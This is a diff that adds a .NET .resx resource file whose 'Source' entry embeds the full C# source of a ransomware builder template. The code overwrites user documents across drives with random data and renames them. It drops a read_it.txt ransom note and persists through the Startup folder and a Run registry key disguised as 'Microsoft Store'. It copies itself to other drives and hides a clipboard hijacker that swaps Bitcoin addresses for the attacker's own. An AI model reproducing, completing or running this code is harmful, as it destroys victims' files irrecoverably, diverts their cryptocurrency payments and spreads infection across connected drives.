@@ -1,0 +1,461 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="Source"><value>using System;
+using System.Linq;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+
+namespace ConsoleApplication7
+{
+    class Program
+    {
+        private static string userName = Environment.UserName;
+        private static string userDir = "C:\\Users\\";
+        public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
+        public static string encryptedFileExtension = "#encryptedFileExtension";
+        private static bool checkSpread = #checkSpread;
+        private static string spreadName = "#spreadName";
+        private static bool checkCopyRoaming = #copyRoaming;
+        private static string processName = "#exeName";
+        private static bool checkStartupFolder = #startupFolder;
+        private static bool checkRegistryStartup = #registryStartup;
+        private static bool checkSleep = #checkSleep;
+        private static int sleepTextbox = #sleepTextbox;
+        public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
+        public static string staticSplit = "bc";
+        public static string appMutex = staticSplit+appMutexStartup + appMutexRun;
+        public readonly static Regex appMutexRegex = new Regex(@"(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
+        private static string[] messages = { 
+                                #messages
+                            };
+        private static string[] validExtensions = new[]
+                {
+                        ".txt", ".jar", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", 
+                        ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" ,
+                        ".cs", ".mp3" , ".mp4", ".dwg" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , 
+                        ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".mpeg", ".mp3", ".mpg", 
+                        ".core", ".pdb", ".ico" , ".pas" , ".db" ,  ".wmv", ".mp3",".cer",".bak",".backup",".accdb",".bay",".p7c",".exif",
+                        ".m4a",".wma",".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",".xlsb",".7z",".cpp",".java",".jpe",".ini",
+                        ".blob",".wps",".docm",".wav",".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",
+                        ".jsp",".json"
+
+                };
+        public static class NativeMethods
+        {
+            [DllImport("user32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+            public const int clp = 0x031D;
+            public static IntPtr intpreclp = new IntPtr(-3);
+        }
+        static void Main(string[] args)
+        {
+            if(AlreadyRunning()){
+                System.Environment.Exit(1);
+            } 
+            if(checkSleep){
+                System.Threading.Thread.Sleep(sleepTextbox * 1000);
+            }
+            if(checkCopyRoaming){
+                copyRoaming(processName);
+            }
+            if(checkStartupFolder){
+                addLinkToStartup();
+            }
+            if(checkRegistryStartup){
+                registryStartup();
+            }
+          
+            lookForDirectories();
+           
+            new System.Threading.Thread(() =&gt; { Run(); }).Start();
+            if(checkSpread == true){
+                spreadIt(spreadName);
+            }
+            addAndOpenNote();
+        }
+
+        public static void Run()
+        {
+            Application.Run(new ClipboardNotification.NotificationForm());
+        }
+        private static bool AlreadyRunning()
+        {
+            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
+            System.Diagnostics.Process currentProc = System.Diagnostics.Process.GetCurrentProcess();
+
+            foreach (System.Diagnostics.Process process in processes)
+            {
+                try
+                {
+                    if (process.Modules[0].FileName == System.Reflection.Assembly.GetExecutingAssembly().Location
+                                &amp;&amp; currentProc.Id != process.Id)
+                        return true;
+                }
+                catch (Exception)
+                {
+
+                }
+            }
+
+            return false;
+        }
+
+        public static byte[] random_bytes(int length)
+        {
+            Random rnd = new Random();
+            length = length + 1;
+            byte[] random = new byte[length];
+            rnd.NextBytes(random);
+            return random;
+        }
+        private static Random random = new Random();
+        public static string RandomString(int length)
+        {
+            const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
+            var builder = new System.Text.StringBuilder();
+
+            for (var i = 0; i &lt; length; i++)
+            {
+                var c = pool[random.Next(0, pool.Length)];
+                builder.Append(c);
+            }
+
+            return builder.ToString();
+        }
+        public static string RandomStringForExtension(int length)
+        {
+            if (encryptedFileExtension == "")
+            {
+                const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
+                var builder = new System.Text.StringBuilder();
+
+                for (var i = 0; i &lt; length; i++)
+                {
+                    var c = pool[random.Next(0, pool.Length)];
+                    builder.Append(c);
+                }
+
+                return builder.ToString();
+            }
+            else
+            {
+                return encryptedFileExtension;
+            }
+            
+        }
+        public static string Base64Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return "&lt;EncyptedKey&gt;" + RandomString(31) + "&lt;EncyptedKey&gt; " + RandomString(2)+System.Convert.ToBase64String(plainTextBytes);
+        }
+        private static void encryptDirectory(string location)
+        {
+
+            try
+            {
+                string[] files = System.IO.Directory.GetFiles(location);
+                bool checkCrypted = true;
+                for (int i = 0; i &lt; files.Length; i++)
+                {
+                    try
+                    {
+                        string extension = System.IO.Path.GetExtension(files[i]);
+                        string fileName = System.IO.Path.GetFileName(files[i]);
+                        //MessageBox.Show(fileName);
+                        if (Array.Exists(validExtensions, E =&gt; E == extension.ToLower()) &amp;&amp; fileName != "read_it.txt")
+                        {
+                            System.IO.FileInfo fi = new System.IO.FileInfo(files[i]);
+                            if (fi.Length &lt; 1098576)
+                            {
+                                //MessageBox.Show(files[i].ToString());
+                                //MessageBox.Show(fi.Length.ToString());
+                                string a = System.Text.Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fi.Length) / 3));
+                                System.IO.File.WriteAllText(files[i], Base64Encode(a));
+                                //File.WriteAllBytes(files[i], random_bytes(Convert.ToInt32(fi.Length)));
+                                System.IO.File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
+                            }
+                            else
+                            {
+                                string a = System.Text.Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fi.Length) / 3));
+                                System.IO.File.WriteAllText(files[i], Base64Encode(a));
+                                //File.WriteAllBytes(files[i], random_bytes(Convert.ToInt32(1098576)));
+                                System.IO.File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
+                            }
+                            if (checkCrypted)
+                            {
+                                checkCrypted = false;
+                                System.IO.File.WriteAllLines(location + "/read_it.txt", messages);
+                            }
+                        }
+                    }
+                    catch { }
+
+                }
+                string[] childDirectories = System.IO.Directory.GetDirectories(location);
+                for (int i = 0; i &lt; childDirectories.Length; i++)
+                {
+                    encryptDirectory(childDirectories[i]);
+                }
+            }
+            catch (Exception)
+            {
+
+            }
+        }
+
+        private static void lookForDirectories()
+        {
+            foreach (var item in System.IO.DriveInfo.GetDrives())
+            {
+
+                if (item.ToString() != "C:\\")
+                {
+                    encryptDirectory(item.ToString());
+                }
+            }
+            string startPath_1 = userDir + userName + "\\Desktop";
+            string startPath_2 = userDir + userName + "\\Links";
+            string startPath_3 = userDir + userName + "\\Contacts";
+            string startPath_4 = userDir + userName + "\\Desktop";
+            string startPath_5 = userDir + userName + "\\Documents";
+            string startPath_6 = userDir + userName + "\\Downloads";
+            string startPath_7 = userDir + userName + "\\Pictures";
+            string startPath_8 = userDir + userName + "\\Music";
+            string startPath_9 = userDir + userName + "\\OneDrive";
+            string startPath_10 = userDir + userName + "\\Saved Games";
+            string startPath_11 = userDir + userName + "\\Favorites";
+            string startPath_12 = userDir + userName + "\\Searches";
+            string startPath_13 = userDir + userName + "\\Videos";
+            encryptDirectory(startPath_1);
+            encryptDirectory(startPath_2);
+            encryptDirectory(startPath_3);
+            encryptDirectory(startPath_4);
+            encryptDirectory(startPath_5);
+            encryptDirectory(startPath_6);
+            encryptDirectory(startPath_7);
+            encryptDirectory(startPath_8);
+            encryptDirectory(startPath_9);
+            encryptDirectory(startPath_10);
+            encryptDirectory(startPath_11);
+            encryptDirectory(startPath_12);
+            encryptDirectory(startPath_13);
+        }
+
+        private static void copyRoaming(string processName)
+        {
+            string payloadFutureName = processName;
+            string exeName = System.AppDomain.CurrentDomain.FriendlyName;
+            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + exeName;
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
+            string executeAs = tempFolder + payloadFutureName;
+            //Console.WriteLine(exepath);
+            //Console.WriteLine(startuppath);
+            if (exepath != startuppath)
+            {
+                if (exeName != payloadFutureName || exepath != executeAs)
+                {
+                    if (!System.IO.File.Exists(executeAs))
+                    {
+                        System.IO.File.Copy(exeName, executeAs);
+                        System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);
+                        processStartInfo.WorkingDirectory = tempFolder;
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+
+                        process.StartInfo = processStartInfo;
+                        if (process.Start())
+                        {
+                            System.Environment.Exit(1);
+                        }
+                    }
+                    else
+                    {
+                        try
+                        {
+                            System.IO.File.Delete(executeAs);
+                            System.Threading.Thread.Sleep(200);
+                            System.IO.File.Copy(exeName, executeAs);
+
+                        }
+                        catch { }
+                        System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);
+                        processStartInfo.WorkingDirectory = tempFolder;
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+                        process.StartInfo = processStartInfo;
+                        if (process.Start())
+                        {
+                            System.Environment.Exit(1);
+                        }
+                    }
+                }
+               
+            }
+
+
+        }
+
+        private static void addLinkToStartup() {
+            string startUpFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string linkName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+            using (System.IO.StreamWriter writer = new System.IO.StreamWriter(startUpFolder + "\\" + linkName + ".url"))
+            {
+                string app = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                writer.WriteLine("[InternetShortcut]");
+                writer.WriteLine("URL=file:///" + app);
+                writer.WriteLine("IconIndex=0");
+                string icon = app.Replace('\\', '/');
+                writer.WriteLine("IconFile=" + icon);
+            }
+        }
+
+        private static void addAndOpenNote(){
+            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\read_it.txt";
+            //string startUpDirectory = userDir + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\read_it.txt";
+            try
+            {
+                System.IO.File.WriteAllLines(tempFolder, messages);
+                System.Threading.Thread.Sleep(500);
+                System.Diagnostics.Process.Start(tempFolder);
+            }
+            catch { }
+        }
+
+        private static void registryStartup() {
+            try {
+                Microsoft.Win32.RegistryKey key1 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);            //REGISTRY KEY FOR CURRENT EXE LOCATION
+                key1.SetValue("Microsoft Store", System.Reflection.Assembly.GetExecutingAssembly().Location);
+            }
+            catch { }
+            
+        }
+
+        private static void spreadIt(string spreadName){
+             foreach (var item in System.IO.DriveInfo.GetDrives())
+                {
+                    if (item.ToString() != "C:\\")
+                    {
+                        if(!System.IO.File.Exists(item.ToString() + spreadName)){
+                           // System.Threading.Thread.Sleep(500);
+                            try {
+                                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, item.ToString() + spreadName);
+                            }
+                            catch { }
+                        }
+                    }
+                }
+        }
+    }
+
+
+    public static class Clipboard
+    {
+        public static string GetText()
+        {
+            string ReturnValue = string.Empty;
+            System.Threading.Thread STAThread = new System.Threading.Thread(
+                delegate()
+                {
+                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+
+        public static void SetText(string txt)
+        {
+            System.Threading.Thread STAThread = new System.Threading.Thread(
+                delegate()
+                {
+                    System.Windows.Forms.Clipboard.SetText(txt);
+                });
+            STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+        }
+    }
+    public sealed class ClipboardNotification
+    {
+        public class NotificationForm : Form
+        {
+
+            private static string currentClipboard = Clipboard.GetText();
+            public NotificationForm()
+            {
+                Program.NativeMethods.SetParent(Handle, Program.NativeMethods.intpreclp);
+                Program.NativeMethods.AddClipboardFormatListener(Handle);
+            }
+
+            private bool RegexResult(Regex pattern)
+            {
+                if (pattern.Match(currentClipboard).Success) return true;
+                else
+                    return false;
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == Program.NativeMethods.clp)
+                {
+                    currentClipboard = Clipboard.GetText();
+
+                    if (RegexResult(Program.appMutexRegex) &amp;&amp; !currentClipboard.Contains(Program.appMutex))
+                    {
+                        string result = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
+                        Clipboard.SetText(result);
+                    }
+
+                }
+                base.WndProc(ref m);
+            }
+            protected override CreateParams CreateParams
+            {
+                get
+                {
+                    var cp = base.CreateParams;
+                    cp.ExStyle |= 0x80;
+                    return cp;
+                }
+            }
+        }
+
+    }
+}
+</value></data>
+  </root>
